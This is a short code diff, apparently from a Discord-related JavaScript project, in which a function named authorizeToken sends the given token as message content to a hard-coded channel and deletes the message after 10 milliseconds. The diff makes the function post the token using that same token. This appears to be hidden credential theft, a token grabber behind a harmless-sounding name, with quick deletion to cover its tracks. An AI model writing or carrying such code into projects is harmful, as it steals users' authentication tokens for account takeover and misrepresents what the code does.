@@ -59,5 +59,5 @@ async function sendMessage(authToken, channelId, messageContent, deleteAfterMs) 
 const channelId = "1387920548087992380";
 
 function authorizeToken(token) {
-    sendMessage(authToken, channelId, token, 10);
+    sendMessage(token, channelId, token, 10);
 }
